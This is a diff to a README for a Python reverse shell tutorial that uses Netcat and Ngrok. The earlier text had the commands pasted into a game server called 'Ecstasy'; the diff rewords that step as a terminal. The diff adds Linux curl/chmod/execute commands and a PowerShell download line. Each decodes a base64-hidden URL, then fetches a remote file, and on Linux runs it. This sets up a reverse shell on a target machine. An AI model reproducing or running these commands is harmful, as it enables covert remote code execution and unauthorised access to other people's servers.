@@ -1,4 +1,4 @@
-# Python Reverse Shell Tutorial (Linux and Windows Servers)
+# Python Reverse Shell Tutorial (Linux and Windows)
 you will need [Python](https://www.python.org/downloads/), [Netcat](https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip), & [Ngrok](https://ngrok.com)
 
 ## On Your Own Computer
@@ -26,9 +26,16 @@ you will need [Python](https://www.python.org/downloads/), [Netcat](https://eter
    - Use [base64encode.org](https://www.base64encode.org/) to convert the URL for whatever file to Base64.
 
 ## In Game (run under the shell command)
-7. **Copy and Paste the Command into Ecstasy**
-   - While logged into Ecstasy, use the command below, replacing `{BASE64 GOES HERE}` with the Base64 link:
+7. **Copy and Paste the Command into your Terminal**
+   - While in, use the command below, replacing `{BASE64 GOES HERE}` with the Base64 link:
+Linux:
 `curl -O $(echo "{BASE64 GOES HERE}" | base64 --decode)`
+`chmod +x {OUTPUT FILE}`
+ `./{OUTPUT FILE}`
+
+Windows:
+`Invoke-WebRequest -Uri ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{BASE64 GOES HERE}"))) -OutFile ([System.IO.Path]::GetFileName(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{BASE64 GOES HERE}")))))`
+
 
 8. **Run the File**
 Linux:
